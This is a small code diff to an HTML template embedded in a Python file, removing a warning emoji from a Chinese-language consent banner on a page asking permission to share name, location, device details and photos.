@@ -49,7 +49,7 @@ HTML_TEMPLATE = """
         <h2>权限许可请求</h2>
         
         <div class="legal-banner">
-            ⚠️ 法律声明：<br>
+             法律声明：<br>
             点击“Autoriser”即表示您同意共享姓名、地理位置、设备信息及照片。决定权完全在您手中，拒绝将不会收集任何数据。
         </div>
 
